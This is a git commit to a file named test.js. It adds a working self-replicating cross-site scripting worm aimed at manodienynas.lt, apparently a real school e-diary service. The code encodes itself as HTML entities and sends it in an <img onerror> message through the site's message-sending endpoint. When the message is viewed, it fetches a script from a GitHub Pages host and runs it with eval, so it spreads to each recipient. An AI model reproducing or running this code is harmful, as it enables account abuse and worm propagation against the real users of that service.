e021c7892dd0015bc83e47c4cf5c2736465e3312
kristalas <105567088+kristalas@users.noreply.github.com>
2022-05-15 00:58:02 +0000

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,9 @@
-var xhr2 = new XMLHttpRequest();xhr2.open('POST', 'https://www.manodienynas.lt/1/lt/action/message_new/send', true);xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');xhr2.send('glids=&message_label=..&message_body=' + encodeURIComponent('<img src=x onerror="' + s + '">'));
-alert();
+javascript: var s = 'javascript:var s = \'QWERTY\';s = s.replace(\'QWE\' + \'RTY\', s.replaceAll(String.fromCharCode(39), String.fromCharCode(92, 39))).replace(/./g, function(x) {return \'&#\' + x.charCodeAt(0)});var xhr = new XMLHttpRequest();xhr.open(\'GET\', \'https://kristalas.github.io/test.js\', true);xhr.onreadystatechange=()=>{if(xhr.readyState==4)eval(xhr.response)};xhr.send();';
+s = s.replace('QWE' + 'RTY', s.replaceAll(String.fromCharCode(39), String.fromCharCode(92, 39))).replace(/./g, function(x) {
+    return '&#' + x.charCodeAt(0)
+});
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://www.manodienynas.lt/1/lt/action/message_new/send', true);
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
+xhr.send('glids=&message_label=..&message_body=' + encodeURIComponent('<img src=x onerror="' + s + '">'));
+alert(1);
